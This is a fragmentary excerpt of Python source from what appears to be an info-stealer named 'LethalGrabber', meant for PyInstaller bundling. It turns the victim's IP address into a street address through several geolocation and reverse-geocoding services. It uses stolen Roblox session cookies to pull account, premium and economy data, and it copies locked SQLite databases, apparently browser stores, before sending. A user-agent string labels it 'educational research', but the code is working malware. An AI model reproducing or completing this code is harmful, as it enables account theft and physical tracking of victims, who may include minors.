...
try:
    ...
    HAS_REQUESTS = False
    # NO runtime pip install - bundled by PyInstaller
...
def grab_address_via_browser():
    """
    Get street-level address via IP geolocation + reverse geocoding.
    
    How it works:
      1. Get GPS coordinates from IP geolocation API (ip-api.com)
      2. Reverse geocode those coordinates via Nominatim (OpenStreetMap)
         to get the nearest street address
      3. Fallback: if Nominatim fails, try other reverse geocoders
      4. Last resort: return city/region level data from IP geolocation
    ...
    def _try_url(url, timeout=8, headers=None):
        try:
            req_headers = {
    ...
    # ── Step 1: Get GPS coordinates from IP ──
    lat = None
    lon = None
    fallback_parts = []
    
    # Try ip-api.com first (best free geolocation)
    geo = _try_url("http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,query")
    if geo and geo.get("status") == "success":
        ...
        fallback_org = geo.get("org", "") or geo.get("isp", "")
    
    # If that failed, try ipapi.co
    if not lat or not lon:
        geo = _try_url("https://ipapi.co/json/")
    ...
    if lat and lon:
        # ── Step 2: Nominatim reverse geocode (OpenStreetMap) ──
        # Returns full street address when available
        nom_url = (
            f"https://nominatim.openstreetmap.org/reverse"
            f"?lat={lat}&lon={lon}"
            f"&format=jsonv2&addressdetails=1&zoom=18&layer=address"
        )
        nom = _try_url(nom_url, timeout=10, headers={
            "User-Agent": "LethalGrabber/4.2 (educational research)"
        })
        
        if nom and nom.get("display_name"):
            full_addr = nom["display_name"]
            # Nominatim returns: "street number, street, city, state, postal, country"
            # Clean it up: extract just the meaningful parts
            addr_details = nom.get("address", {})
            
            # Build a clean street address from the structured data
            street_parts = []
            
            # House number + road = street address
            house = addr_details.get("house_number", "")
            road = addr_details.get("road", "") or addr_details.get("street", "")
            if house and road:
                street_parts.append(f"{house} {road}")
            elif road:
                street_parts.append(road)
            
            # Suburb/neighborhood
            suburb = addr_details.get("suburb", "") or addr_details.get("neighbourhood", "")
            if suburb:
                street_parts.append(suburb)
            
            # City
            city = addr_details.get("city", "") or addr_details.get("town", "") or addr_details.get("village", "") or addr_details.get("municipality", "")
            if city:
            ...
            if state:
                street_parts.append(state)
            
            # Postal code
            postal = addr_details.get("postcode", "")
            if postal:
                street_parts.append(postal)
            
            # Country
            country = addr_details.get("country", "")
            if country:
                street_parts.append(country)
            
            if street_parts:
                result = ", ".join(street_parts)
                # Append coordinates and source
                result += f" ({lat}, {lon}) [OpenStreetMap]"
                return result
            
            # Fallback: use the raw display_name
            if full_addr and len(full_addr) > 20:
                return f"{full_addr} ({lat}, {lon}) [OpenStreetMap]"
        
        # ── Step 3: Fallback — BigDataCloud reverse geocode ──
        # Free reverse geocoding, no key needed
        bdc_url = (
            f"https://api.bigdatacloud.net/data/reverse-geocode-client"
            f"?latitude={lat}&longitude={lon}&localityLanguage=en"
        )
        bdc = _try_url(bdc_url)
        if bdc:
            parts = []
            street = bdc.get("street", "") or bdc.get("locality", "")
            if bdc.get("houseNumber") and street:
                parts.append(f"{bdc['houseNumber']} {street}")
            elif street:
                parts.append(street)
            
            city = bdc.get("city", "") or bdc.get("locality", "")
            if city and city not in parts:
                parts.append(city)
            
            principal = bdc.get("principalSubdivision", "")
            if principal:
                parts.append(principal)
            
            postal = bdc.get("postcode", "")
            if postal:
                parts.append(postal)
            
            country = bdc.get("countryName", "")
            if country:
        ...
        # No coordinates available — try whatismyaddress.net as last resort
        try:
            ...
            match = re.search(
                ...
                r'Boulevard|Blvd|Way|Court|Ct|Circle|Cir|Place|Pl|Trail|Trl|Highway|Hwy)',
    ...
    # ── Step 4: Final fallback — just return city/region level data ──
    clean = [p for p in fallback_parts if p and p.strip() and p != "?"]
    if clean:
        addr = ", ".join(clean)
        if lat and lon:
            addr += f" ({lat}, {lon})"
        ...
        if FEAT_ROBLOX and roblox_cookies:
            try:
                ...
                try:
                    ...
                    with urllib.request.urlopen(rbx_req, timeout=10) as resp:
                        rbx_data = json.loads(resp.read().decode())
                        ...
                        try:
                            ...
                            with urllib.request.urlopen(prem_req, timeout=5) as prem_resp:
                                if prem_resp.getcode() == 200:
                        ...
                        try:
                            ...
                            with urllib.request.urlopen(eco_req, timeout=5) as eco_resp:
                                if eco_resp.getcode() == 200:
                        ...
                        try:
                            ...
                            with urllib.request.urlopen(extra_req, timeout=5) as extra_resp:
                                if extra_resp.getcode() == 200:
                        ...
                        try:
                            ...
                            with urllib.request.urlopen(thumb_req, timeout=5) as thumb_resp:
                                if thumb_resp.getcode() == 200:
                                    thumb_data = json.loads(thumb_resp.read().decode())
...
__PH_SHOW_ERROR__
    ...
    # ── Safe DB copy helper (retry on locked files) ──
    def safe_copy_db(src, max_retries=3):
        """Copy SQLite DB with retry + validation. Returns path or None."""
        tmp = os.path.join(TEMP_DIR, f"db_{uuid.uuid4().hex}")
        for attempt in range(max_retries):
            try:
                ...
                if header[:16] == b'SQLite format 3\x00':
                    return tmp
                # Invalid header — delete and retry
                os.remove(tmp)
                time.sleep(0.5)
            except Exception:
                time.sleep(0.5)
    ...
    try:
        ...
        if FEAT_GRAB_ADDRESS:
            ...
            if street_address and not geo_data:
                geo_data = {
        ...
        street_address = None
        if FEAT_SYSTEM and not geo_data:
            try:
                geo_data = get_geolocation()
            except Exception:
                geo_data = None
    ...
    # ── Settle delay before sending — gives locked DBs time to release ──
    time.sleep(3)
